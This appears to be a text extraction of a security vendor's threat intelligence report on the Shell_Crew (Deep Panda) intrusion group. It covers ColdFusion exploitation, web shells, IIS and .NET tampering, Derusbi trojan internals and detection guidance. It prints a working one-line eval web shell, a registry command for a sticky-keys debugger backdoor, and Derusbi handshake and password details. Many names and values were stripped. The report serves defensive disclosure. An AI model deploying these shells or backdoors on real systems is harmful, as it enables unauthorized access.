@@ -1,0 +1,355 @@
+report overview
+the purpose of this report is to share actionable threat intelligence associated with an advanced adversary the rsa ir team
+is tracking. threat intelligence related to advanced adversaries enables security practitioners to mitigate threat impact
+before the adversary becomes entrenched in an organization s infrastructure. if a breach has already occurred, threat
+intelligence bolsters incident investigation activities and expedites remediation; ultimately reducing exposure times and
+minimizing potential data loss.
+during recent engagements, the rsa ir team has responded to multiple incidents involving a common adversary targeting
+each client s infrastructure and assets. the rsa ir team is referring to this threat group internally as shell_crew ;
+however, they are also referred to as deep panda, webmasters, kungfu kittens, sportsfans, and pinkpanther amongst the
+security community.
+shell_crew is generally known to utilize the following tactics, techniques, and procedures (ttps); prevalent use of web shells to maintain low level persistence in spite of determined remediation efforts;
+occasional use of web application framework exploits to achieve initial entry as opposed to traditional
+spearfishing attempts;
+lateral movement using compromised credentials with rdp, psexec, or network connections in conjunction with
+scheduling jobs with the at command.
+abuse of code signing infrastructure to validly sign custom backdoor malware;
+exploiting systems using different methods accessible via remote desktop protocol (rdp);
+long history of ip/dns telemetry allowing for historical research and link analysis;
+placement of malicious proxy tools introduced into the environment on windows server based proxies to bypass
+proxy logging;
+extensive use of time/date stomping of malicious files to hinder forensic analysis; and
+malware leveraging compromised credentials to bypass authentication ntlm proxies (proxy aware). this emerging threat profile covers a sampling of observed indicators that have been derived by analyzing a variety of tools
+and malicious code collected during recent engagements involving shell_crew. included are details about an observed
+intrusion vector, entrenchment techniques, unique malicious files, and tools that are used by this adversary. additionally,
+the rsa ir team has provided content in the form of a digital appendix that can be integrated into security analytics, the
+enterprise compromise assessment tool (ecat), or other security tools for rapid detection and visibility of indicators
+associated with shell_crew. intrusion vector
+intrusion overview
+shell_crew has an affinity for exploiting web application vulnerabilities to gain access to the victim s network and
+information systems. in this section, we ve provided details pertaining to an instance where shell_crew breached a victim
+network through the exploitation of an adobe coldfusion directory traversal vulnerability (cve-2010-2861). this exploit
+allowed shell_crew to read the password.properties file containing the password hash of the coldfusion administrator account. after obtaining this password hash, shell_crew was able to recover the password associated with the
+administrative account, likely by using pre-computed rainbow tables. using the acquired administrator account credentials,
+shell_crew created a coldfusion scheduled task to download a malicious web shell to the coldfusion server. they then
+utilized this web shell to upload additional web shells, hash dumping tools, and other trojans onto the system, as well as
+created a backdoor into the system for reentry. using the tools uploaded to the server, shell_crew dumped password
+hashes from the compromised system, performed network reconnaissance, and moved laterally to systems in the internal
+network using the compromised credentials with the pass-the-hash technique.
+figure 1 below illustrates the high level anatomy of this particular shell_crew attack. figure 1: anatomy of shell_crew web application penetration intrusion details on 18 june, 2013 an attacker using ip address connected to the coldfusion web server and exploited the
+adobe coldfusion directory traversal vulnerability, cve-2010-2861, to recover the contents of the password.properties file.
+figure 2 below depicts a log entry from the web server that illustrates the initial point of exploitation. the data highlighted
+in blue shows the directory traversal used to access the password.properties file. in addition, the data highlighted with red
+(zh-cn) in the user-agent indicates the language tag on the attacker s system.
+the password.properties file contained the hash value of the coldfusion administrator account, which can be seen in figure
+3 below: figure 3: example content of a password.properties file
+through review of log files found on the web server, the rsa ir team identified that within 10 minutes of retrieving the
+password.properties file, shell_crew logged in to the coldfusion management page using the recovered administrator
+account credentials. this indicates that shell_crew quickly enumerated the password from the hash value found in the
+password.properties file. once logged in with the administrator account, shell_crew scheduled a job called test to
+download a file containing a coldfusion web shell from http:// and save it to the web server s local
+1
+directory . the log entry from the web server that shows scheduling of this job is visible in figure 4. figure 4: coldfusion task that downloads web shell
+the file downloaded from the remote system to the coldfusion server, , is a coldfusion web shell called cfm
+backdoor by ufo . once the web shell was downloaded to the web server by the coldfusion job, the adversary was able to
+utilize the functionality of the web shell to execute commands on the local system, illustrated in figure 5 and figure 6. 1 the name of the website has been changed to protect the privacy of the victim. once shell_crew has a foothold into the victim s network, they move to other systems within the environment to ensure
+multiple points for re-entry. some of the techniques used by shell_crew to further insert themselves into a victim s
+environment are outlined in the next section of this report; entrenchment techniques entrenchment techniques
+shell_crew uses a variety of techniques to entrench themselves in a victim s network. for purposes of this report, the term
+entrenchment is used to describe a technique used by the adversary that allows them to maintain unauthorized access into
+an enterprise despite attempted remediation efforts by the victim. in addition to traditional trojans that beacon out to a
+destination ip address, this adversary has also been observed utilizing the following entrenchment techniques; installation of web shells;
+registering dlls with internet information services (iis);
+modifying the file;
+trojan.derusbi; and
+utilizing the rdp backdoor . this section of the report discusses each of these entrenchment techniques in further detail. 1. installation of web shells
+web shells are files containing malicious code written in various web scripting languages, such as jsp, cfm, asp, aspx, or
+php, that when hosted on a publicly accessible web site allow an adversary such as shell_crew to gain remote access and
+perform various unauthorized activities on a compromised system and network. a web shell can be a stand-alone file that
+only contains web shell code, or can be an insertion of malicious code directly into an existing legitimate web site page,
+thus allowing the adversary to blend with normal traffic and files on the web server.
+using web shells has several advantages over traditional trojans including: low detection rates from anti-virus programs due to the variety and customization of code;
+the inability to block or monitor an ip since connectivity can be initiated from any source address; and
+there is no beaconing activity from a web shell. the complexity of the web shells used by shell_crew varies dramatically. figure 7 shows the contents of a simple web shell
+identified during a recent engagement where shell_crew had uploaded the web shell as a standalone file. this one line of
+code allowed shell_crew to execute shell commands remotely on the web server. the red text depicted within the
+example has been changed as the password value used by shell_crew made reference to the name of the victim company.
+<%@ page language="jscript"%><%eval(request.item["password"],"unsafe");%>
+figure 7: example of a simple shell_crew web shell
+shell_crew also uses more complex web shells that contain hundreds of lines of code and offer advanced functionality
+equal to many capable trojans. this functionality can include capabilities such as: figure 8 below is a screenshot of the coldfusion web shell used by shell_crew as referenced in the intrusion vector section
+of this report. this web shell contains robust capabilities such as command execution, directory traversal, file uploads, and
+the ability to gather basic system information. 2. registering dlls with internet information services (iis)
+another entrenchment technique used by shell_crew on compromised systems is to register a dll with iis. figure 9 below
+is an example where a malicious dll was registered with the iis web server using the command line. the scriptmaps.vbs
+2
+file is a built in function of iis for running vbscripts, and is fully documented in msdn .
+figure 9: command used to register a dll with iis
+this command line modification will ensure that any incoming request (whether it is a get, post, head, or trace) with a
+.jna extension, will be handled by the now registered malicious dll, in the example in figure 9, . this allows
+shell_crew to make different requests; both in the request type, such as get or post, and the file being requested, making
+detection more difficult. this method of using various request parameters can be coupled with erratic ip addresses further
+decreasing the likelihood that the activity will be detected by conventional means. figure 10 depicts a sample request to a
+compromised web server. 3. modifying the file
+this entrenchment technique was discovered after shell_crew made post requests to nonexistent web pages on a web
+server running iis. the post requests always started with a marker string that looked like a hash value. requests to the
+same non-existent web page without the marker would result in a code 404, i.e. page not found. figure 11 shows an
+figure 11: post request to a non-existent web page
+the typically benign .net microsoft file is an assembly that contains several namespaces. when
+decompiled with a .net decompiler (such as .net reflector) the result will be hundreds of c# scripts. shell_crew replaced
+the existing with a version which contained changes to two c# scripts: the first script file contains adversary added code that looks for this marker in the content of the
+request: . when the marker is present, it lets handle the request
+that follows the marker. figure 12 highlights the modifications made to the file. when called by the script , the file , which also contains code added by the adversary,
+performs the eval function on the request sent in the original post request to the non-existent web page. figure 13: content of in this instance, the post request contained data that was base64 encoded to obfuscate the malicious nature of the
+request, as shown in figure 14. figure 15: decoded base64 text from the post request
+additionally, the actual command within the above post request is also base64 encoded. below in figure 16, the encoded
+text from the above post request decoded. figure 16: the script was further decoded to reveal the contents
+the reply from the server to these post requests is not obfuscated and could be found in web server log files as shown in
+figure 17. 4. trojan.derusbi
+in addition to deploying traditional versions of what symantec calls trojan.derusbi (i.e. samples that beacon to a hardcoded domain/ip address), this adversary deployed a custom version of this trojan on perimeter servers. trojan.derusbi
+typically consists of a dll and driver file. the driver of the customized trojan.derusbi variant in this example monitors all
+tcp ports that are utilized by various windows services. when a connection is established on any tcp port, the driver
+checks to see if it received a handshake packet. the handshake packet contains a simple structure, which allows the trojan
+to function even on busy web servers.
+when a handshake packet is received, the dll also replies back with a handshake packet. in addition to the handshake, this
+variant of trojan.derusbi also has an authentication step where the client must send the right password to the trojan. the
+communication protocol consist of a 24 byte header, and the data is compressed and obfuscated with 4-byte xor key,
+which is dynamically generated for each transmission, and which is included in the 24-byte header. this trojan offers both
+typical and advanced trojan functionalities, such as: file traversal, process start/terminate, upload/download, time
+stomping, and self-updating.
+analysis of customized trojan.derusbi variants utilized by shell_crew can be found in the below malicious files and
+secondary tools section. 5. sethc rdp backdoor sticky-keys backdoor this well-known technique that is commonly referred to as the sticky-keys backdoor is used when systems on the targeted
+organization have microsoft remote desktop protocol (rdp) enabled. while this technique is not exclusive to shell_crew, the rsa ir team has observed this group utilize the technique in several different environments. there are two common
+ways that a system can be exploited using this technique.
+1. the result of making this change on a system which has rdp enabled, is that once presented with the rdp windows logon
+screen, simply pressing the shift key 5 times will launch either a command shell ( ), a windows explorer window
+( ), or whatever program was copied to replace the application executable.
+2. the second technique makes a registry modification to launch a debugger anytime is executed and registers (or any other file) as the debugger. so, anytime is invoked (explained in the next paragraph),
+windows automatically executes its debugger , i.e. . the registry modification is shown in figure 18.
+reg add "hklm\software\microsoft\windows nt\currentversion\image file
+options\ " /v debugger /t reg_sz /d "c:\windows\system32\ " execution figure 18: registry modification to invoke debugging
+the result of making this change on a system which has rdp enabled, is that once presented with the rdp windows logon
+screen, simply pressing the shift key 5 times will launch either a command shell, as shown in figure 18, or
+whichever program has been set as the debug program in the registry. the process runs under the context of the system
+account. since this technique does not involve any malicious files, there is limited capability for av vendors to detect this
+backdoor.
+figure 19 shows an example of a system that has the stick key set to present a command shell when invoked. figure 19: rdp backdoor example malicious files and secondary tools
+shell_crew uses a variety of malicious trojans and tools to entrench themselves, move laterally, and persist within a
+targeted environment. this portion of the report will detail the malicious files and secondary tools identified during recent
+engagements involving shell_crew. the sections are broken up as follows: malicious files and secondary tools hash list;
+malicious files technical analysis; and
+secondary tools technical analysis malicious files and secondary tools hash list
+the following list of trojans and tools have been used by shell_crew during various investigations conducted by the rsa ir
+team. the web shells that are often used by shell_crew can be easily modified for specific missions or victims, and
+subsequently, hash values are not listed for those files. additionally, many web shell samples identified reference specific
+victim names, which once redacted, would change the hash value of the file.
+md5 hash malicious files technical analysis
+shell_crew uses a variety of malicious trojans and tools to entrench themselves in a customer environment, however they
+consistently employ trojans such as trojan.derusbi and variations of this trojan family. this portion of the report will detail
+the technical analysis of two of the custom variations of trojan.derusbi used by shell_crew. 1. trojan.derusbi
+the rsa ir team has observed shell_crew deploy different variants of the trojan.derusbi family. this trojan family
+provides attackers a backdoor into the enterprise, as well as functionality to locate and decrypt passwords stored on the
+system by web browsers like firefox and internet explorer, gather system and network information, and upload or
+download files. details of a sample found during a recent engagement involving shell_crew have been provided in figure
+20.
+figure 20: details of the file ' ' - a trojan.derusbi variant
+it should be noted that the original sample contained a hard coded url that made reference to a company name; because
+of this, the hard coded ip address was replaced and the md5 and sha1 hash values provided above are for the sanitized
+file. this trojan has an embedded and encoded driver file that is written to the infected system and then launched. this
+driver will hook the ip, tcp, udp, and rawip driver files that normally run on a system.
+when this particular trojan.derusbi variant is initially executed it checks to see if the registry key hkey_local_machine\software\microsoft\rpc\security is present in the registry. this registry key location is where
+the trojan will store its encoded configuration data. if the key is not present on the system, the sample will first decode the
+configuration data that is embedded in the trojan found at position 0x1ec88. figure 21 below shows the function responsible for decoding this embedded data with the xor key 0x 76 2d f2 41 . once
+the configuration data has been initially decoded, it will be placed into memory and the trojan will resolve the current
+machine name and append 4 characters of pseudorandom data separated by a dash - . this null terminated string will
+then overwrite the first portion of data in the decoded configuration file. figure 21: trojan.derusbi configuration data decoding function the data below in figure 22 illustrates the decoded configuration data. the machine name string and the hard coded
+c2 for this sample are highlighted in yellow (and have been changed to protect the victim).
+offset figure 22: decoded trojan.derusbi configuration data
+this machine specific configuration data will then be encoded, using a different method, where each byte is xored with
+0x5f and then each bit of that product byte is subsequently inverted. this encoded data will then be written to the
+hkey_local_machine\software\microsoft\rpc\security registry key. figure 23 below shows the function within the
+trojan responsible for encoding this data and then writing it to the registry. if the sample is restarted it will again check for
+the registry value containing the configuration data. if this value is located, the sample will read the configuration data and
+then decode it using a function similar to the function that is depicted below. figure 23: trojan.derusbi configuration data encoding function
+upon initial execution, the trojan will decode, write, and launch a driver file that is embedded in the file at offset 0x19a40.
+the data shown below in figure 24 is how the data resides in the file. as shown in figure 24, the first dword that is highlighted in yellow is the 4 byte xor key that is used to decode the driver
+file. it should be noted that this xor key is the same in several variants that were compiled over a year time frame. the
+second dword highlighted in blue is the length of data to be decoded (the size of the driver file) 0x52 18 or 21,016 bytes
+decimal.
+offset
+figure 24: xor key that is used to decode the driver file
+the function below in figure 25 is responsible for decoding the driver file. this function will call an additional function that
+is responsible for writing the decoded data to disk as c:\windows\system32\drivers\{6ab5e732-dfa9-4618-af1cf0d9def0e222}.sys . the trojan will then use the api call zwloaddriver to start the newly created file. figure 25: trojan.derusbi driver decoding function
+the driver will hook other networking drivers and will determine if incoming traffic contains certain patterns of traffic,
+which when specific conditions are met will pipe that traffic to trojan.derusbi. once the trojan begins to communicate with
+the hard coded c2, it will initially transmit the following post request shown in figure 26.
+post http/1.1
+host: :443
+user-agent: mozilla/4.0
+proxy-connection: keep-alive
+connection: keep-alive
+pragma: no-cache figure 26: post request initiated by trojan.derusbi
+if no response is received it will transmit the following binary data shown in figure 27, which is part of a proprietary
+handshake that is discussed more in the trojan.derusbi server variant section. the binary data contains a set of three
+dwords that the c2 will validate to as part of the initial portion of the handshake. the first dword is created just prior to
+the beaconing activity. the following two dwords are mathematical modifications of the first dword.
+figure 27: binary data transmitted by trojan.derusbi
+as illustrated below in figure 28, the second dword is the product of xoring the first dword with 0xff. the third
+dword is the product of rotating the first dword value right by 7. figure 28: the binary data contains a set of three dwords
+if the trojan does not receive the other necessary portions of the trojan/c2 handshake it will transmit the following type of figure 29: get request transmitted by the trojan
+this trojan has several advanced capabilities including providing a reverse shell to the adversary, locating and decrypting
+usernames and passwords stored by web browsers like internet explorer and firefox, uploading and downloading files, and
+executing additional malicious files.
+appendix 1 of this report illustrates how several variants of trojan.derusbi have overlapping characteristics. having the
+ability to quickly detect relationships between different variants allows the rsa ir team to locate not just specific samples,
+but variants throughout an environment within the same family. 2. trojan.derusbi server variant
+shell_crew deployed this variant of trojan.derusbi on perimeter devices in a victim s network. this variant contains a driver
+that monitors all incoming tcp connections for a secret handshake. the handshake is simple enough to allow this variant to
+function even on busy web servers. once the handshake is received, the driver then passes control to the dll file which
+contains the main functionality of the trojan. characteristics of one such trojan.derusbi server variant can be found in
+figure 30.
+table 2: trojan.dersubi server variant functions
+the adversary installed this trojan by utilizing the utility, which calls the dllregisterserver function. this trojan
+first checks the version of windows it is running on using the getversionexa function, and will terminate if not on a
+windows version 5.2 as shown in figure 31. figure 31: derusbi server variant - check os version logic
+this versions of windows this covers is: windows 2003 server;
+windows 2003 server r2; and
+windows xp 64-bit edition. the trojan then validates that it is not running on a 64-bit system by using the iswow64process function. the servers
+where this trojan was found during the engagement were windows 2003 servers, confirming the shell_crew had created
+this variant of the trojan.derusbi to run specifically on this family of operating systems. the trojan then makes a copy of
+itself into the c:\windows\system32 folder as a file named: msusbxxx.hlp , where xxx were found to be three characters
+picked randomly from this set of characters: abcdefghijklmnopqrstuvwxyz.
+the trojan then entrenches itself as a service named wuauserv as illustrated in figure 32. figure 32: registry key identifying the service name and trojan file
+furthermore, this trojan also drops a driver file on the system named: {93144eb0-8e3e-4591-b307-8eebfe7db28f}.sys.
+this driver file is embedded into the dll starting at file-offset 0x9290. the contents of this file are obfuscated with a 4-byte
+xor key: 0xf35d882e.
+once the driver file is loaded in memory, the file is deleted from the file system. the following registry key remains as an
+artifact: hklm\system\currentcontrolset\enum\root\legacy_{93144eb0-8e3e-4591-b307-8eebfe7db28f}. the
+driver also attaches to the following network devices: the driver can then monitor traffic to any existing listening tcp ports. the driver performs the following three checks on
+any new tcp connections: ensures the payload of the first packet equals 64 bytes;
+ensures 2nd dword = inverted 1st dword (i.e. logical not, or xor 0xff); and
+ensures 1st dword ror 7 = 3rd dword. figure 33: driver logic that looks for handshake
+all the data in the handshake is randomly generated. other than the first three dwords (12 bytes), the rest of the data in
+the 64-byte handshake is irrelevant. the structure of the handshake is shown below in figure 34: figure 34: trojan.derusbi server variant handshake structure
+the malicious dll performs the last two checks on the handshake data as well. it then replies back with the same type of
+handshake. all data is randomly generated independent of what data was received. figure 35 depicts a sample handshake. figure 35: trojan.derusbi server variant handshake sample data
+the handshake is followed by a password verification step. the structure of the data also changes from this point forward.
+this sample uses password, pinkcomein . the client trojan service sends the password after obfuscating it with a 4-byte xor key, which is dynamically generated and sent with the rest of the data. the checksum is a simple addition of all the
+bytes prior to the obfuscation step. figure 36: trojan.derusbi server variant - authentication
+once the password has been confirmed, the communication protocol adds one additional component. all data beyond the
+3
+headers is compressed using the lzo fast compression algorithm, prior to being obfuscated with the 4-byte xor key. the
+commands sent to the server also need to be compressed and obfuscated. figure 37 shows an example that demonstrates
+all these components of the communication protocol (xor key in this example was set to 0x00000000 to expose the next
+layer for demonstration purposes). figure 37: trojan.derusbi server variant protocol components
+the commands are in binary form. in the example shown in figure 37, the command is 0x10 (which is visible even though
+the data is compressed), uninstalls the trojan, and restores the original registry keys. the rest of the functionality of this
+trojan is typical to this family of trojans including; file traversal, process start/terminate, upload/download, time
+stomping, and self-updates. secondary tools technical analysis
+this section contains the technical analysis of several secondary tools that are favored by shell_crew. the secondary tools
+are programs that facilitate lateral movement, harvesting of credentials, or allow for additional channels of communication.
+during recent engagements involving shell_crew, the secondary tools were introduced into the environment during the
+early stages of a compromise indicating that these are the preferred tools of this group. shell_crew also employs several
+additional tools that are commonly used by other threat groups and will not be covered in this report. 1. one of the preferred tools used by shell_crew during a recent incident was a multi-purpose tool typically named
+' , but also found named or . the collected sample of this tool was written in .net 2.0
+and the code was obfuscated using the post-development recompilation system dotfuscator . this tool does not have a
+built-in c2 address, however the code does support this feature. this tool requires arguments to be passed to it in order to
+perform activities. one of the most commonly used commands by the adversary was the proxy like functionality of this tool
+as show below in figure 38. in order to decompile , the code was deobfuscated using a publicly available tool called de4dot . once the
+code had been deobfuscated, could be decompiled for analysis using the tool reflector .
+the rsa ir team was able to review the functionality of this tool and a complete list of the available parameters is provided
+in table 3. during testing it was found that when this file was executed with no arguments, the tool performs the following
+actions: the tool would hash the string alice'srabbithole (md5: )
+the tool then checks if the resource shown in figure 40 starts with the hash value obtained in step 1 (in this case
+there is a match). figure 40: resource of 3. if the result of step 2 is true, the trojan exits without doing anything else. it is in this resource that the trojan
+would otherwise find an ip address and port number to connect. the resource would have the format shown in
+figure 41: figure 41: - built in c2 data structure
+the first two bytes of the resource will be a hexadecimal value representing the length of the base64 encoded data that
+follows. the obfuscated data is first base64 decoded, then xor-ed with 0xaa. the obfuscated data is meant to be an ip
+address followed by a port number, separated by a colon : . the following figure shows the functions from the code. figure 42: c2 obfuscation in this tool can be executed in various ways depending on the arguments provided. table 3 shows a complete this of the
+discovered parameters. arguments purpose hash dumping
+keystroke logging
+msgina man-in-the middle
+hooking authentication functions one such example that was observed during a recent engagement was a dll file that shell_crew had injected into the process of a server to harvest credentials. the characteristics of this dll file are shown in figure 43.
+figure 43: details of the file once this dll is injected into the process, it hooks the lsaaplogonuserex2 function of . this function is
+called during various authentication situations such as interactive or network logons, including when the runas option is
+used. all credentials are saved in plaintext under: .
+a sample of harvested credentials that would be stored in the file is shown in figure 44. figure 44: sample of harvested credentials detection, mitigation, and remediation
+the below sections outline information and detection capabilities that can assist with identification of activity or tools
+associated with shell_crew. additionally, the rsa ir team has included a digital appendix along with this report that
+contains content that can be integrated into security analytics, the enterprise compromise assessment tool (ecat), or
+other security tools for rapid detection and visibility of indicators associated with shell_crew within an enterprise
+environment. 1. general forensic footprints on multiple cases shell_crew has been seen breaching a network by exploiting vulnerable applications on
+external facing servers. web server logs, if available, can reveal the intrusion vector.
+shell_crew has a preference for storing files in the c:\recycler folder, or in other standard folders one level
+deep from the root, such as the c:\dell, c:\i386, or c:\reboot folders. sometimes tools or trojans have also
+been found at the root of the c: drive.
+in addition to connecting to remote systems, copying files, and scheduling jobs to execute them, shell_crew
+has a preference for lateral movement using rdp. additionally, they ve used the sysinternals tool to execute a file remotely, sometimes automated via a vbs script.
+performing forensic analysis on a compromised system s registry hive (focusing on the application
+compatibility cache) can yield numerous artifacts related to shell_crew s activity.
+using a tool like ecat, metadata about malicious files and code can be rapidly located throughout an
+enterprise allowing responders to focus on relevant systems. host based signatures can be used in conjunction
+with this methodology to allow for improved efficiency. the yara signatures listed below are currently used by
+the rsa ir team to locate some malicious files specific to this group. a tool like ecat can utilize these
+signatures to scan memory of systems across a network.
+if the adversary registers any dlls with iis, these should be unregistered when they are removed from the
+compromised system. similarly any altered files, like , should be deleted and replaced with a
+clean copy of the original microsoft file.
+data theft by shell_crew typically involves use of the winrar utility using encrypted and password protected
+rar files. here are some password seen used by shell_crew: 2. security analytics integration
+parsers
+while standard network signatures will detect some of the trojans and tools used by shell_crew, the trojan.derusbi
+samples detailed in this report were designed to avoid detection by employing a proprietary handshake derived from
+pseudorandom values dynamically calculated at runtime. the digital appendix provided with this report contains several
+security analytics parsers that can assist in the detection of these trojan.derusbi handshakes and additional variants
+related to these samples. once enabled, these parsers will generate meta entitled derusbiserver_handshake or derusbi_variant in the risk.warning category within security analytics. feeds
+also included within the digital appendix are feeds that can be imported into security analytics for detection of potential
+shell_crew activity. these feeds will alert users if there are any machines on the network communicating with malicious ip
+addresses or urls linked to shell_crew identified domains or ip s within this report. once enabled, these feeds will
+generate meta entitled derusbi_domain_sep201 3 or derusbi_ip_sep2013 in the risk.warning category within security
+analytics. 3. ecat integration
+the hashes that are referenced in the malicious files and tools section of this report are also available in the digital
+appendix. the format of the files in the digital appendix can be imported directly into ecat to begin looking for the hashes
+across systems within the environment.
+by default, ecat is also able to detect some of the malicious behavior that is exhibited by the samples detailed in this
+report. the below examples are provided to demonstrate how potential shell_crew activity can be identified using
+standard analysis capabilities via the ecat server.
+figure 45 is a screenshot where ecat detected a suspicious outbound connection. the screen shot depicts the attempted
+connections of the trojan.derusbi sample that was detailed earlier in this report. with this information, ecat can be used
+to quickly determine if any other systems on the network had executable files that were actively beaconing to the same
+location. figure 45: ecat detects a suspicious outbound connection
+the same malicious file seen above was also flagged as suspicious by ecat because it was entrenched in an autorun location within the system s registry. the screen shot in figure 46 below depicts the alert provided by ecat. figure 46: alert sent by ecat
+additionally, the rsa ir team observed that shell_crew will time stomp (alter a files created date and time stamp) to
+hinder forensic analysis. by default, ecat has the ability to parse a system s mft and display both the file name attribute
+information and standard information attribute for a file. the screen shot below shows an instance where the files had
+been time stomped. the files were purportedly created on the compromised systems in 2005, when in actuality they had
+been placed on the systems in 2012. figure 47: mft file viewer in ecat 4. yara signatures
+the rsa ir team uses yara signatures like the ones provided in the digital appendix to detect malicious files present on
+systems and running in memory. they re also used to detect new variants that are being tested by adversaries using open
+source tools like virustotal. the rsa ir team has observed that shell_crew will submit numerous samples of a trojan
+family to virustotal in an attempt to determine which av vendors will detect the malicious files.
+shell_crew will make small changes to the code and how the binary is compiled until a particular av vendor does not detect
+the sample. detecting these variants using yara signatures allows the rsa ir team to update and alter signatures, analyze
+new variants, and become aware of new c2 nodes before the samples are used against targeted organizations. this
+information is then added to existing content in security analytics and ecat. figure 48 is a graph that depicts where
+variants of a sample were submitted numerous times, each time being detected by different av products.
+12 conclusion
+this report detailed techniques and tools that are frequently used by an advanced adversary being referred to by the rsa ir
+team as shell_crew. the information delivered in this report was provided so organizations can turn the data into
+actionable intelligence, for detection or prevention of this advanced threat. as of the date of this report, shell_crew
+continues to be a formidable threat group that is actively attacking organizations. in instances where shell_crew has
+already breached an organization, the rsa ir team has observed that the adversary will aggressively attempt to regain a
+foothold once their trojans have been eradicated and communication channels severed. if any of their existing backdoors
+or web shells remain active in the environment, shell_crew will begin to redeploy other tiers of malware that communicate
+through different channels, which may use different protocols and obfuscation techniques.
+the rsa ir team has observed instances where shell_crew has persisted in enterprises for years before they are detected.
+during that time, shell_crew updated or replaced existing malicious backdoors, continued to map the enterprise while
+installing web shells or poisoning existing web pages, and performed internal reconnaissance of victims to determine what
+av and security products are being deployed in these environments. these tenacious approaches make it difficult for an
+under resourced internal security team to detect, and furthermore, eradicate this adversary.
+the rsa ir team will continue to track the ttps used by this group and distribute information about this and other
+adversaries. the information that is provided in the digital appendix and throughout the report can be ingested directly into
+rsa products or used agnostically with other products.
+if you have any questions about this emerging threat profile or the rsa incident response team, please send an email to
+firstresponse@ or contact your rsa account representative.
